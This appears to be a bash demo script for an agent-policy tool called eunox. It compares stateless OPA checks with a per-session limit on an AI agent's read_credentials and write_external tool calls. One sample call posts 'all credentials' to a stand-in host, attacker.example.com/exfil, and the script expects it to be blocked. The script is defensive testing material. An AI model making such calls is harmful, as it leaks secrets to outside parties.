#!/usr/bin/env bash
# Copyright 2026 Eunolabs, LLC
# SPDX-License-Identifier: Apache-2.0
#
# Scenario 1 — Credential exfiltration: OPA allows unlimited; eunox blocks
#               after the first call.
#
# The agent is allowed to call read_credentials and write_external once each.
# OPA's stateless policy permits every call — it has no session counter.
# eunox's maxCalls:1 condition enforces the limit at the enforcement layer.

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=common.sh
source "${SCRIPT_DIR}/common.sh"

print_header "Scenario 1 — Credential Exfiltration"
echo ""
echo "  Policy intent: agent may read credentials and write to an external"
echo "  endpoint ONCE per session.  Repeated calls must be blocked."
echo ""
echo "  OPA policy:   scenario1.rego — stateless allow-list (no counter)"
echo "  eunox policy: manifests/scenario1.yaml — maxCalls: 1"

# ── OPA evaluation (stateless) ───────────────────────────────────────────────
print_step "OPA: call 1 — read_credentials (expect: ALLOW)"
opa_check "scenario1" "read_credentials"

print_step "OPA: call 2 — read_credentials (expect: ALLOW — OPA cannot count)"
opa_check "scenario1" "read_credentials"
print_note "OPA allowed the second call.  It has no session state — it ALWAYS allows this tool."

print_step "OPA: call 3 — write_external (expect: ALLOW)"
opa_check "scenario1" "write_external"

print_step "OPA: call 4 — write_external again (expect: ALLOW — OPA cannot count)"
opa_check "scenario1" "write_external"
print_note "OPA cannot detect that write_external has already been called this session."

# ── eunox enforcement (stateful) ─────────────────────────────────────────────
print_step "Initialising eunox MCP session …"
mcp_init
echo "  Session ID: ${MCP_SESSION_ID}"

print_step "eunox: call 1 — read_credentials (expect: ALLOW)"
mcp_call "read_credentials" '{"service":"aws"}' || true

print_step "eunox: call 2 — read_credentials (expect: DENY — maxCalls:1 exceeded)"
mcp_call "read_credentials" '{"service":"aws"}' || true

print_step "eunox: call 3 — write_external (expect: ALLOW)"
mcp_call "write_external" '{"url":"https://internal.example.com/collect","payload":"report data"}' || true

print_step "eunox: call 4 — write_external again (expect: DENY — maxCalls:1 exceeded)"
mcp_call "write_external" '{"url":"https://attacker.example.com/exfil","payload":"all credentials"}' || true

echo ""
print_header "Scenario 1 — Summary"
echo ""
echo "  ┌─────────────────────────────┬───────────┬──────────────┐"
echo "  │ Call                        │ OPA       │ eunox        │"
echo "  ├─────────────────────────────┼───────────┼──────────────┤"
echo "  │ read_credentials (1st)      │ ✔ ALLOW   │ ✔ ALLOW      │"
echo "  │ read_credentials (2nd)      │ ✔ ALLOW   │ ✘ DENY       │"
echo "  │ write_external   (1st)      │ ✔ ALLOW   │ ✔ ALLOW      │"
echo "  │ write_external   (2nd)      │ ✔ ALLOW   │ ✘ DENY       │"
echo "  └─────────────────────────────┴───────────┴──────────────┘"
echo ""
echo "  OPA is stateless: every call to an allowed tool succeeds."
echo "  eunox tracks per-session call counts and enforces maxCalls:1."
echo ""
